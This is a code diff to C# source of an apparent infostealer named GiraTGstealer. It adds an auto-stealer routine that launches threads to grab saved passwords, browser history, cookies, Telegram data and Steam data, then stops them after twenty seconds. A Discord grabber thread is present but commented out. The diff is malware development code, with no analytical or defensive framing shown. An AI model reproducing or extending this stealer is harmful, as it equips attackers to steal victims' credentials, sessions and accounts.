@@ -5,11 +5,13 @@ using System.Threading;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using GiraTGstealer.stealer;
 
 namespace GiraTGstealer
 {
     internal class AutoStealer
     {
+        public static Thread AutoStealerThread = new Thread(steal);
         private static string lockfile = Path.GetDirectoryName(config.InstallPath) + "\\autosteal.lock";
 
         public static void loadDlls()
@@ -22,6 +24,33 @@ namespace GiraTGstealer
         private static void steal()
         {
             File.Create(lockfile);
+
+            List<Thread> thread = new List<Thread>(){
+                new Thread(Passwords.start),
+                new Thread(History.start),
+                new Thread(Cookies.start),
+                new Thread(TelegramGrabber.get),
+                //new Thread(DiscordGrabber.get),
+                new Thread(SteamGrabber.get)
+            };
+            Console.WriteLine("🌹 Starting autostealer...");
+            foreach(Thread t in thread) 
+            {
+                t.Start();
+            }
+            Thread.Sleep(20 * 1000);
+            Console.WriteLine("🥀 Stopping autostealer...");
+            foreach (Thread t in thread)
+            {
+                if(t.IsAlive)
+                {
+                    try
+                    {
+                        t.Abort();
+                    }
+                    catch { }
+                }
+            }
         }
     }
 }
